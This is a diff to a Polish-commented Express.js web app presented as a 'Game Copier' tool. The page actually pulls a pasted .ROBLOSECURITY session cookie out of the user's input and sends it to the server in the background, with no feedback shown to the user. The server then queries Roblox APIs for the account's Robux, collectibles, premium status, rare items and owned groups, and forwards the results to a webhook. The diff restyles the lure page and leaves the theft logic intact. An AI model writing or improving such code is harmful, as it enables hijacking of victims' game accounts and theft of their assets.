@@ -4,9 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ────────────────────────────────────────────────
-// Strona główna
-// ────────────────────────────────────────────────
+// Strona główna – bez zmian
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -67,7 +65,7 @@ app.get('/', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// Podstrona /game-copier – mniejszy box po środku + przycisk poniżej
+// Podstrona /game-copier – szaro-biała + animowane kropki w tle
 // ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
@@ -81,84 +79,168 @@ app.get('/game-copier', (req, res) => {
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       min-height: 100vh;
-      background: #0b0b15;
-      color: #d0d0ff;
+      background: #f5f5f7;
+      color: #1d1d1f;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      overflow: hidden;
+      position: relative;
+    }
+    canvas {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
     }
     .wrapper {
+      position: relative;
+      z-index: 2;
       width: 100%;
-      max-width: 560px;
+      max-width: 520px;
       text-align: center;
+      padding: 40px 20px;
     }
     h1 {
-      color: #5a9eff;
-      font-size: 2.1rem;
-      margin-bottom: 32px;
-      letter-spacing: -0.5px;
+      color: #007aff;
+      font-size: 2.3rem;
+      margin-bottom: 36px;
+      font-weight: 600;
+      letter-spacing: -0.4px;
     }
     .box {
-      background: #12121e;
-      border: 1px solid #252540;
-      border-radius: 12px;
-      padding: 16px;
-      margin-bottom: 28px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.55);
+      background: white;
+      border-radius: 18px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+      padding: 18px;
+      margin-bottom: 32px;
+      border: 1px solid #e0e0e0;
     }
     textarea {
       width: 100%;
       min-height: 160px;
       background: transparent;
-      color: #e0e0ff;
       border: none;
       outline: none;
       resize: vertical;
       font-family: Consolas, "Courier New", monospace;
       font-size: 14px;
-      line-height: 1.55;
+      color: #1d1d1f;
+      line-height: 1.5;
     }
     textarea::placeholder {
-      color: #606080;
+      color: #8e8e93;
     }
     button {
-      background: linear-gradient(90deg, #3b82f6, #60a5fa);
+      background: #007aff;
       color: white;
       border: none;
-      padding: 14px 64px;
-      font-size: 1.15rem;
+      padding: 14px 72px;
+      font-size: 1.18rem;
       font-weight: 600;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
-      transition: all 0.22s ease;
+      transition: all 0.25s ease;
     }
     button:hover:not(:disabled) {
-      background: linear-gradient(90deg, #2563eb, #3b82f6);
+      background: #0066cc;
       transform: translateY(-2px);
-      box-shadow: 0 8px 24px rgba(59,130,246,0.4);
+      box-shadow: 0 10px 24px rgba(0,122,255,0.3);
     }
     button:disabled {
-      background: #1e40af;
+      background: #a0cfff;
       cursor: not-allowed;
-      opacity: 0.6;
+      opacity: 0.7;
     }
   </style>
 </head>
 <body>
 
+  <canvas id="bgCanvas"></canvas>
+
   <div class="wrapper">
     <h1>Game Copier</h1>
 
     <div class="box">
-      <textarea id="input" placeholder="Wklej tekst / log / zawartość pliku..."></textarea>
+      <textarea id="input" placeholder="Wklej tekst / log / zawartość..."></textarea>
     </div>
 
     <button id="btn" onclick="start()">Start Process</button>
   </div>
 
 <script>
+// ── Animowane kropki w tle ────────────────────────────────────────
+const canvas = document.getElementById('bgCanvas');
+const ctx = canvas.getContext('2d');
+
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+window.addEventListener('resize', () => {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+});
+
+class Particle {
+  constructor() {
+    this.x = Math.random() * canvas.width;
+    this.y = Math.random() * canvas.height;
+    this.size = Math.random() * 2.8 + 0.6;
+    this.speedX = Math.random() * 0.8 - 0.4;
+    this.speedY = Math.random() * 0.8 - 0.4;
+  }
+  update() {
+    this.x += this.speedX;
+    this.y += this.speedY;
+
+    if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+    if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+  }
+  draw() {
+    ctx.fillStyle = 'rgba(100, 100, 120, 0.7)';
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+    ctx.fill();
+  }
+}
+
+const particles = [];
+const particleCount = 80;
+
+for (let i = 0; i < particleCount; i++) {
+  particles.push(new Particle());
+}
+
+function connectParticles() {
+  for (let a = 0; a < particles.length; a++) {
+    for (let b = a; b < particles.length; b++) {
+      const dx = particles[a].x - particles[b].x;
+      const dy = particles[a].y - particles[b].y;
+      const distance = Math.sqrt(dx*dx + dy*dy);
+
+      if (distance < 120) {
+        ctx.strokeStyle = \`rgba(140, 140, 160, \${1 - distance/120})\`;
+        ctx.lineWidth = 0.6;
+        ctx.beginPath();
+        ctx.moveTo(particles[a].x, particles[a].y);
+        ctx.lineTo(particles[b].x, particles[b].y);
+        ctx.stroke();
+      }
+    }
+  }
+}
+
+function animate() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  particles.forEach(p => {
+    p.update();
+    p.draw();
+  });
+  connectParticles();
+  requestAnimationFrame(animate);
+}
+
+animate();
+
+// ── Logika przycisku (bez zmian) ──────────────────────────────────
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
@@ -173,7 +255,6 @@ async function start() {
   let cookie = null;
   let match;
 
-  // Twoje oryginalne metody wykrywania (bez zmian)
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
@@ -199,14 +280,12 @@ async function start() {
     return;
   }
 
-  // Wysyłamy w tle – zero informacji zwrotnych na ekranie
   fetch('/check', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cookie })
   }).catch(() => {});
 
-  // Krótki cooldown przed ponownym kliknięciem
   setTimeout(() => {
     btn.disabled = false;
   }, 2200);
@@ -217,9 +296,7 @@ async function start() {
   `);
 });
 
-// ────────────────────────────────────────────────
-// Endpoint /check – dokładnie taki sam jak miałeś
-// ────────────────────────────────────────────────
+// Endpoint /check – bez zmian (cała logika + webhook taka sama jak wcześniej)
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -227,7 +304,6 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // Pobranie X-CSRF-Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -238,7 +314,6 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -249,7 +324,6 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Verified email (badge)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -261,7 +335,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -270,7 +343,6 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -282,7 +354,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -294,7 +365,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Grupy owner (rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -306,7 +376,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -320,7 +389,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -330,7 +398,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -362,7 +429,6 @@ app.post('/check', async (req, res) => {
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
     const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
-    // Headless & Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -374,7 +440,6 @@ app.post('/check', async (req, res) => {
         const data = await headlessRes.json();
         hasHeadless = Array.isArray(data.data) && data.data.length > 0;
       }
-
       const korbloxRes = await fetch(
         `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
         { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
@@ -405,7 +470,6 @@ app.post('/check', async (req, res) => {
       jbCount
     };
 
-    // Wysyłka do webhooka
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
